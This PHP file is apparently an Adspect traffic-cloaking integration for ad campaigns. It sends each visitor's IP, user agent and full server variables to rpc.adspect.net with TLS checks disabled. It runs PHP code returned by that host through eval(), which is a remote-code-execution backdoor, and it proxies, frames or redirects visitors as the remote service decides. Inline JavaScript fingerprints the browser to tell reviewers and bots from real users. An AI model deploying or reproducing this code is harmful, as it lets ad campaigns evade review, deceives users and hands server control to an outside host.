<?php
ini_set('display_errors', '0');
error_reporting(E_ALL);

// Include campaign helper for Adspect integration
require_once __DIR__ . '/campaign_helper.php';

$campaignHelper = new CampaignHelper();
$GLOBALS['campaignHelper'] = $campaignHelper; // Make it accessible to Adspect eval
$streamId = $campaignHelper->getRedirectStreamId();

if (!function_exists('adspect')) {
    function adspect_exit($code, $message)
    {
        http_response_code($code);
        exit($message);
    }
    function adspect_dig($array, $key, $default = '')
    {
        return array_key_exists($key, $array) ? $array[$key] : $default;
    }
    function adspect_curl($url, $options)
    {
        $curl = curl_init();
        curl_setopt_array($curl, [CURLOPT_URL => $url, CURLOPT_CONNECTTIMEOUT => 60, CURLOPT_TIMEOUT => 60, CURLOPT_SSL_VERIFYHOST => 0, CURLOPT_SSL_VERIFYPEER => 0,]);
        if (!empty($options)) {
            curl_setopt_array($curl, $options);
        }
        $content = curl_exec($curl);
        $errno = curl_errno($curl);
        if ($errno) {
            adspect_exit(500, 'curl error: ' . curl_strerror($errno));
        }
        $code = curl_getinfo($curl, CURLINFO_HTTP_CODE);
        $type = curl_getinfo($curl, CURLINFO_CONTENT_TYPE);
        curl_close($curl);
        return [$code, $content, $type];
    }
    function adspect_rpc_url($sid)
    {
        $sid = adspect_dig($_GET, '__sid', $sid);
        $query = adspect_dig($_SERVER, 'QUERY_STRING');
        return "https://rpc.adspect.net/v2/$sid?$query";
    }
    function adspect_client_ip($keys)
    {
        foreach ($keys as $key) {
            if (isset($_SERVER[$key])) {
                $ip = $_SERVER[$key];
                if (is_string($ip)) {
                    switch ($key) {
                        case 'HTTP_X_FORWARDED_FOR':
                        case 'HTTP_FORWARDED_FOR':
                            if (!preg_match('{([^,\s]+)\s*$}', $ip, $m)) {
                                break;
                            }
                            $ip = $m[1];
                        default:
                            if (filter_var($ip, FILTER_VALIDATE_IP)) {
                                return $ip;
                            }
                            break;
                    }
                }
            }
        }
        adspect_exit(500, 'Client IP address not available');
    }
    function adspect_rpc_headers()
    {
        $ip = adspect_client_ip(['HTTP_CF_CONNECTING_IP', 'HTTP_TRUE_CLIENT_IP', 'HTTP_FASTLY_CLIENT_IP', 'HTTP_X_ENVOY_EXTERNAL_ADDRESS', 'HTTP_X_CLIENT_IP', 'HTTP_CLIENT_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_REAL_IP', 'HTTP_REAL_IP', 'HTTP_FORWARDED_FOR', 'REMOTE_ADDR',]);
        $ua = adspect_dig($_SERVER, 'HTTP_USER_AGENT');
        return ['User-Agent:', "Adspect-IP: $ip", "Adspect-UA: $ua",];
    }
    function adspect_rpc_data()
    {
        $data = [];
        if ($_SERVER['REQUEST_METHOD'] === 'POST') {
            if (!isset($_POST['data'])) {
                adspect_exit(500, 'Missing POST data');
            }
            $data = json_decode($_POST['data'], true);
            if (!is_array($data)) {
                adspect_exit(500, 'Invalid POST data');
            }
            if (isset($_COOKIE['_cid'])) {
                $data['cid'] = $_COOKIE['_cid'];
            }
        }
        $data['server'] = $_SERVER;
        return json_encode($data);
    }
    function adspect_rpc($sid)
    {
        list($code, $json) = adspect_curl(adspect_rpc_url($sid), [CURLOPT_HTTPHEADER => adspect_rpc_headers(), CURLOPT_POST => true, CURLOPT_POSTFIELDS => adspect_rpc_data(), CURLOPT_RETURNTRANSFER => true,]);
        if ($code !== 200) {
            adspect_exit(500, "RPC error $code");
        }
        $data = json_decode($json, true);
        if (!isset($data['ok'], $data['js'], $data['cid'], $data['action'], $data['target'])) {
            adspect_exit(500, 'Invalid RPC response');
        }
        return [$data, $json];
    }
    function adspect_resolve_path($path)
    {
        if ($path[0] === DIRECTORY_SEPARATOR) {
            $path = adspect_dig($_SERVER, 'DOCUMENT_ROOT', __DIR__) . $path;
        } else {
            $path = __DIR__ . DIRECTORY_SEPARATOR . $path;
        }
        return realpath($path);
    }
    function adspect_spoof_request($url = '')
    {
        $_SERVER['REQUEST_METHOD'] = 'GET';
        $_POST = [];
        if ($url !== '') {
            $url = parse_url($url);
            if (isset($url['path'])) {
                if (substr($url['path'], 0, 1) === '/') {
                    $_SERVER['REQUEST_URI'] = $url['path'];
                } else {
                    $_SERVER['REQUEST_URI'] = dirname($_SERVER['REQUEST_URI']) . '/' . $url['path'];
                }
            }
            if (isset($url['query'])) {
                parse_str($url['query'], $_GET);
                $_SERVER['QUERY_STRING'] = $url['query'];
            } else {
                $_GET = [];
                $_SERVER['QUERY_STRING'] = '';
            }
        }
    }
    function adspect_try_files()
    {
        foreach (func_get_args() as $path) {
            if (is_file($path)) {
                if (!is_readable($path)) {
                    adspect_exit(403, 'Permission denied');
                }
                header('Content-Type: text/html');
                switch (strtolower(pathinfo($path, PATHINFO_EXTENSION))) {
                    case 'php':
                    case 'phtml':
                    case 'php5':
                    case 'php4':
                    case 'php3':
                        adspect_require($path);
                        exit;
                    default:
                        header('Content-Type: ' . adspect_content_type($path));
                        $name = basename($path);
                        header("Content-Disposition: attachment; filename=\"$name\"");
                    case 'html':
                    case 'htm':
                        header('Content-Length: ' . filesize($path));
                        readfile($path);
                        exit;
                }
            }
        }
    }
    function adspect_require()
    {
        require_once func_get_arg(0);
    }
    function adspect_content_type($path)
    {
        if (function_exists('mime_content_type')) {
            $type = mime_content_type($path);
            if (is_string($type)) {
                return $type;
            }
        }
        return 'application/octet-stream';
    }
    function adspect_serve_local($url)
    {
        $path = (string) parse_url($url, PHP_URL_PATH);
        if ($path === '') {
            return;
        }
        $path = adspect_resolve_path($path);
        if (is_string($path)) {
            adspect_spoof_request($url);
            if (is_dir($path)) {
                chdir($path);
                adspect_try_files('index.php', 'index.html', 'index.htm');
            } else {
                chdir(dirname($path));
                adspect_try_files($path);
            }
        }
        adspect_exit(404, 'File not found');
    }
    function adspect_crypt($in, $key)
    {
        $il = strlen($in);
        $kl = strlen($key);
        $out = '';
        for ($i = 0; $i < $il; ++$i) {
            $out .= chr(ord($in[$i]) ^ ord($key[$i % $kl]));
        }
        return $out;
    }
    function adspect_proxy_headers($keys)
    {
        $headers = [];
        foreach ($keys as $key) {
            if (array_key_exists($key, $_SERVER)) {
                $header = strtr(strtolower(substr($key, 5)), '_', '-');
                $headers[] = "$header: {$_SERVER[$key]}";
            }
        }
        return $headers;
    }
    function adspect_proxy($url, $param = null, $key = null)
    {
        $url = parse_url($url);
        if (empty($url)) {
            adspect_exit(500, 'Invalid proxy URL');
        }
        $options = [CURLOPT_USERAGENT => adspect_dig($_SERVER, 'HTTP_USER_AGENT'), CURLOPT_FOLLOWLOCATION => true, CURLOPT_RETURNTRANSFER => true,];
        extract($url);
        if (!isset($scheme)) {
            $scheme = 'http';
        }
        if (!isset($host)) {
            $host = adspect_dig($_SERVER, 'HTTP_HOST', 'localhost');
        }
        if (isset($port)) {
            $host = "$host:$port";
            $options[CURLOPT_PORT] = $port;
        }
        $origin = "$scheme://$host";
        if (!isset($path)) {
            $path = '/';
        } elseif ($path[0] !== '/') {
            $path = "/$path";
        }
        $url = $origin . $path;
        if (isset($query)) {
            $url .= "?$query";
        }
        $headers = adspect_proxy_headers(['HTTP_ACCEPT', 'HTTP_ACCEPT_LANGUAGE', 'HTTP_COOKIE']);
        $headers[] = 'Cache-Control: no-cache';
        $options[CURLOPT_HTTPHEADER] = $headers;
        list($code, $data, $type) = adspect_curl($url, $options);
        http_response_code($code);
        if (is_string($data)) {
            if (isset($param, $key) && preg_match('{^text/(?:html|css)}i', $type)) {
                $base = $path;
                if ($base[-1] !== '/') {
                    $base = dirname($base);
                }
                $base = rtrim($base, '/');
                $rw = function ($m) use ($origin, $base, $param, $key) {
                    list($repl, $what, $url) = $m;
                    $url = htmlspecialchars_decode($url);
                    $url = parse_url($url);
                    if (!empty($url)) {
                        extract($url);
                        if (isset($host)) {
                            if (!isset($scheme)) {
                                $scheme = 'http';
                            }$host = "$scheme://$host";
                            if (isset($port)) {
                                $host = "$host:$port";
                            }
                        } else {
                            $host = $origin;
                        }if (!isset($path)) {
                            $path = '';
                        }if (!strlen($path) || $path[0] !== '/') {
                            $path = "$base/$path";
                        }if (!isset($query)) {
                            $query = '';
                        }$host = base64_encode(adspect_crypt($host, $key));
                        parse_str($query, $query);
                        $query[$param] = "$path#$host";
                        $repl = '?' . http_build_query($query);
                        if (isset($fragment)) {
                            $repl .= "#$fragment";
                        }$repl = htmlspecialchars($repl);
                        if ($what[-1] === '=') {
                            $repl = "\"$repl\"";
                        }$repl = $what . $repl;
                    }return $repl;
                };
                $re = '{(href=|src=|url\()["\']?((?:https?:|(?!#|[[:alnum:]]+:))[^"\'[:space:]>)]+)["\']?}i';
                $data = preg_replace_callback($re, $rw, $data);
            }
        } else {
            $data = '';
        }
        header("Content-Type: $type");
        header('Content-Length: ' . strlen($data));
        echo $data;
    }
    function adspect_execute()
    {
        eval (func_get_arg(0));
    }
    function adspect($sid)
    {
        header('Cache-Control: no-store');
        if (!function_exists('curl_init')) {
            adspect_exit(500, 'php-curl extension is missing');
        }
        if (!function_exists('json_encode') || !function_exists('json_decode')) {
            adspect_exit(500, 'php-json extension is missing');
        }
        $param = '_';
        $key = hex2bin(str_replace('-', '', $sid));
        if ($key === false) {
            adspect_exit(500, 'Invalid stream ID');
        }
        if (array_key_exists($param, $_GET) && strpos($_GET[$param], '#') !== false) {
            list($url, $host) = explode('#', $_GET[$param], 2);
            $host = adspect_crypt(base64_decode($host), $key);
            unset($_GET[$param]);
            $query = http_build_query($_GET);
            $url = "$host$url?$query";
            adspect_proxy($url, $param, $key);
            exit;
        }
        list($data, $json) = adspect_rpc($sid);
        global $_adspect;
        $_adspect = $data;
        extract($data);
        if (isset($e)) {
            eval ($e);
        }
        if ($js) {
            setcookie('_cid', $cid, time() + 60);
            return $data;
        }
        switch ($action) {
            case 'local':
                adspect_serve_local($target);
                return null;
            case 'proxy':
                adspect_proxy($target, $param, $key);
                exit;
            case 'fetch':
                adspect_proxy($target);
                exit;
            case 'iframe':
                $target = htmlspecialchars($target);
                exit("<!DOCTYPE html><html><head><meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"></head><body><iframe src=\"$target\" style=\"position:absolute;top:0;left:0;width:100%;height:100%;border:none;\"></iframe>");
            case 'noop':
                adspect_spoof_request($target);
                return null;
            case '301':
            case '302':
            case '303':
            case '307':
            case '308':
                header("Location: $target", true, (int) $action);
                exit;
            case 'refresh':
                header("Refresh: 0; url=$target");
                adspect_spoof_request();
                return null;
            case 'meta':
                $target = htmlspecialchars($target);
                exit("<!DOCTYPE html><head><meta http-equiv=\"refresh\" content=\"0; url=$target\">");
            case 'form':
                $target = htmlspecialchars($target);
                exit("<!DOCTYPE html><html><body><form id=\"form\" action=\"$target\" method=\"GET\"></form><script>document.getElementById(\"form\").submit();</script>");
            case 'assign':
                $target = json_encode($target);
                exit("<!DOCTYPE html><head><script>location.assign($target);</script>");
            case 'replace':
                $target = json_encode($target);
                exit("<!DOCTYPE html><head><script>location.replace($target);</script>");
            case 'top':
                $target = json_encode($target);
                exit("<!DOCTYPE html><head><script>top.location=$target;</script>");
            case 'return':
                if (!is_numeric($target)) {
                    adspect_exit(500, 'Non-numeric status code');
                }
                http_response_code((int) $target);
                exit;
            case 'php':
                adspect_execute($target);
                return null;
            case 'js':
                $target = htmlspecialchars(base64_encode($target));
                exit("<!DOCTYPE html><body><script src=\"data:text/javascript;base64,$target\"></script>");
            case 'xar':
                header("X-Accel-Redirect: $target");
                exit;
            case 'xsf':
                header("X-Sendfile: $target");
                exit;
            default:
                adspect_exit(500, 'Unsupported action. Update integration file.');
        }
        return $data;
    }
}
$data = adspect($streamId);
if (!isset($data)) {
    return;
} ?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=Edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
</head>

<body>
    <script>(function (q, u, r, g, t, v, w, x) {
            var n = {}, l = { mode: "php", errors: n }; try {
                function c(b, a) { try { l[b] = a() } catch (f) { n[b] = f.name } } function d(b, a) { c(b, function () { function f(m) { try { var h = a[m]; switch (typeof h) { case "object": null !== h && (h = h.toString()); break; case "function": h = u.prototype.toString.call(h) }e[m] = h } catch (y) { n[b + "." + m] = y.name } } var e = {}, k; for (k in a) f(k); try { var p = q.getOwnPropertyNames(a); for (k = 0; k < p.length; ++k)f(p[k]); e["!!"] = p } catch (m) { } return e }) } d("console", r); d("document", g); (function (b, a) {
                    c(b, function () {
                        var f =
                            {}; a = a.attributes; for (var e in a) e = a[e], f[e.nodeName] = e.nodeValue; return f
                    })
                })("documentElement", g.documentElement); d("location", t); d("navigator", v); d("window", x); d("screen", w); c("timezoneOffset", function () { return (new Date).getTimezoneOffset() }); c("closure", function () { return function () { }.toString() }); l.frame = !0; c("frame", function () { l.frame = self !== top }); c("touchEvent", function () { return q.prototype.toString.call(g.createEvent("TouchEvent")) }); c("tostring", function () {
                    function b() { } var a = 0; b.toString =
                        function () { ++a; return "" }; r.log(b); return a
                }); c("webgl", function () { var b = g.createElement("canvas").getContext("webgl"), a = b.getExtension("WEBGL_debug_renderer_info"); return { vendor: b.getParameter(a.UNMASKED_VENDOR_WEBGL), renderer: b.getParameter(a.UNMASKED_RENDERER_WEBGL) } }); function z(b, a, f) { var e = b.prototype[a]; b.prototype[a] = function () { l.proto = !0 }; f(); b.prototype[a] = e } try { z(Array, "includes", function () { return g.createElement("video").canPlayType("video/mp4") }) } catch (b) { }
            } catch (c) { } (function () {
                var c =
                    g.createElement("form"), d = g.createElement("input"); c.method = "POST"; c.action = t.href; d.type = "hidden"; d.name = "data"; d.value = JSON.stringify(l); c.appendChild(d); g.body.appendChild(c); c.submit()
            })()
        })(Object, Function, console, document, location, navigator, screen, window);
    </script>
</body>

</html>
<?php exit;
